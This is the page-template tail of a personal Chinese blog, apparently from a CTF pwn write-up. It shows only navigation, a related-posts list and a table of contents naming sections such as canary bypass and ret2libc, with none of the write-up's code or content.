class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/09/25/NewStarCTF2023-week1/" title="NewStarCTF2023-week1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">NewStarCTF2023-week1</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/09/25/NewStarCTF2023-week1/" title="NewStarCTF2023-week1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-25</div><div class="title">NewStarCTF2023-week1</div></div></a></div><div><a href="/2023/09/22/BUUCTF%EF%BC%882%EF%BC%89-rip/" title="BUUCTF（2）-rip"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-22</div><div class="title">BUUCTF（2）-rip</div></div></a></div><div><a href="/2023/09/21/BUUCTF%EF%BC%881%EF%BC%89-test-your-nc/" title="BUUCTF（1）-test-your-nc"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-21</div><div class="title">BUUCTF（1）-test-your-nc</div></div></a></div><div><a href="/2023/09/22/BUUCTF%EF%BC%883%EF%BC%89-warmup-csaw-2016/" title="BUUCTF（3）-warmup-csaw-2016"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-22</div><div class="title">BUUCTF（3）-warmup-csaw-2016</div></div></a></div><div><a href="/2023/09/22/BUUCTF%EF%BC%884%EF%BC%89-ciscn-2019-n-1/" title="BUUCTF（4）-ciscn-2019-n-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-22</div><div class="title">BUUCTF（4）-ciscn-2019-n-1</div></div></a></div><div><a href="/2023/09/22/BUUCTF%EF%BC%885%EF%BC%89-pwn1-sctf-2016/" title="BUUCTF（5）-pwn1-sctf-2016"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-22</div><div class="title">BUUCTF（5）-pwn1-sctf-2016</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">YunL</div><div class="author-info__description">YunL的个人博客，什么都可能有</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN1-canary"><span class="toc-number">1.</span> <span class="toc-text">PWN1-canary</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E7%82%B9%E5%87%BB%E4%B8%8B%E8%BD%BD%EF%BC%9Acanary"><span class="toc-number">1.1.</span> <span class="toc-text">题目点击下载：canary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%88%E7%AB%AF%E4%B8%AD%E6%9F%A5%E7%9C%8Bcanary"><span class="toc-number">1.2.</span> <span class="toc-text">终端中查看canary</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#canary"><span class="toc-number">1.2.1.</span> <span class="toc-text">canary</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#64%E4%BD%8D%E7%B3%BB%E7%BB%9F%E4%B8%AD%E5%85%B6%E6%A0%88%E7%BB%93%E6%9E%84%E5%A6%82%E4%B8%8B"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">64位系统中其栈结构如下</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Canary%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.2.</span> <span class="toc-text">Canary绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%87%8F%E5%8E%BB0xa%E7%9A%84%E5%8E%9F%E5%9B%A0%EF%BC%9A"><span class="toc-number">1.2.2.0.1.</span> <span class="toc-text">减去0xa的原因：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ida%E6%9F%A5%E7%9C%8B"><span class="toc-number">1.3.</span> <span class="toc-text">ida查看</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">1.4.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gdb%E8%B0%83%E8%AF%95"><span class="toc-number">1.5.</span> <span class="toc-text">gdb调试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E7%9A%84-x%E4%B8%8D%E8%83%BD%E8%B6%85%E8%BF%879%E4%B8%AA%EF%BC%8C%E8%B6%85%E8%BF%879%E4%B8%AA%E4%BC%9A%E7%9B%B4%E6%8E%A5%E5%81%9C%E6%AD%A2%E8%BF%90%E8%A1%8C%EF%BC%8C%E7%96%91%E9%97%AE%E5%BE%85%E8%A7%A3%E5%86%B3"><span class="toc-number">1.5.1.</span> <span class="toc-text">(这里的-%x不能超过9个，超过9个会直接停止运行，疑问待解决</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.5.2.</span> <span class="toc-text">)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">1.6.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BE%97%E5%88%B0flag"><span class="toc-number">1.7.</span> <span class="toc-text">得到flag</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN2-secret-number"><span class="toc-number">2.</span> <span class="toc-text">PWN2-secret number</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E7%82%B9%E5%87%BB%E4%B8%8B%E8%BD%BD%EF%BC%9Asecretnumber"><span class="toc-number">2.1.</span> <span class="toc-text">题目点击下载：secretnumber</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%88%E7%AB%AF%E4%B8%AD%E6%9F%A5%E7%9C%8Bsecretnumber"><span class="toc-number">2.2.</span> <span class="toc-text">终端中查看secretnumber</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ida%E6%9F%A5%E7%9C%8B-1"><span class="toc-number">2.3.</span> <span class="toc-text">ida查看</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-1"><span class="toc-number">2.4.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BE%97%E5%88%B0flag-1"><span class="toc-number">2.5.</span> <span class="toc-text">得到flag</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN3-ret2libc"><span class="toc-number">3.</span> <span class="toc-text">PWN3-ret2libc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E7%82%B9%E5%87%BB%E4%B8%8B%E8%BD%BD%EF%BC%9Aret2libc"><span class="toc-number">3.1.</span> <span class="toc-text">题目点击下载：ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%88%E7%AB%AF%E4%B8%AD%E6%9F%A5%E7%9C%8Bret2libc"><span class="toc-number">3.2.</span> <span class="toc-text">终端中查看ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-1"><span class="toc-number">3.3.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gdb%E8%B0%83%E8%AF%95-1"><span class="toc-number">3.4.</span> <span class="toc-text">gdb调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%BE%E5%88%B0%E5%AF%B9%E5%BA%94%E7%89%88%E6%9C%AC%E7%9A%84libc%E5%BA%93"><span class="toc-number">3.5.</span> <span class="toc-text">找到对应版本的libc库</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/05/NewStarCTF2023-week2/" title="NewStarCTF2023-week2">NewStarCTF2023-week2</a><time datetime="2023-10-05T10:14:47.000Z" title="发表于 2023-10-05 18:14:47">2023-10-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/09/25/NewStarCTF2023-week1/" title="NewStarCTF2023-week1">NewStarCTF2023-week1</a><time datetime="2023-09-25T11:37:21.000Z" title="发表于 2023-09-25 19:37:21">2023-09-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/09/23/ctf-wiki%E5%9F%BA%E6%9C%ACROP2-ret2shellcode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="ret2shellcode">ret2shellcode</a><time datetime="2023-09-23T05:54:51.000Z" title="发表于 2023-09-23 13:54:51">2023-09-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/09/23/ctf-wiki%E5%9F%BA%E6%9C%ACROP1-ret2text%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="ctf-wiki基本ROP1-ret2text学习笔记">ctf-wiki基本ROP1-ret2text学习笔记</a><time datetime="2023-09-23T05:49:42.000Z" title="发表于 2023-09-23 13:49:42">2023-09-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/09/23/hexo%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%8A%9F%E8%83%BD%E9%85%8D%E7%BD%AE/" title="hexo文件下载功能配置">hexo文件下载功能配置</a><time datetime="2023-09-23T01:58:20.000Z" title="发表于 2023-09-23 09:58:20">2023-09-23</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By YunL</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
